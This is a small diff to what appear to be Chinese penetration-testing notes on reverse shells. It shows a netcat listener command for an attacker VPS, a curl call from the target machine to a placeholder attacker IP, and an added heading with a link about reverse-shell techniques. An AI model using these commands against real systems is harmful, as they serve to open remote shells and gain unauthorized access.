@@ -1,3 +1,4 @@
+ 
 1、判断目标存在哪些反弹shell的命令
 
 
@@ -32,5 +33,9 @@
 
    1) VPS:nc-v -n -lp 3308
    2) 目标机器：curl http://xx.xx.xx.xx:3636
+
+5、反弹shell手法
+
+ https://mp.weixin.qq.com/s/WRwxDyXrTmgnsPQBlhXEVw
 
    
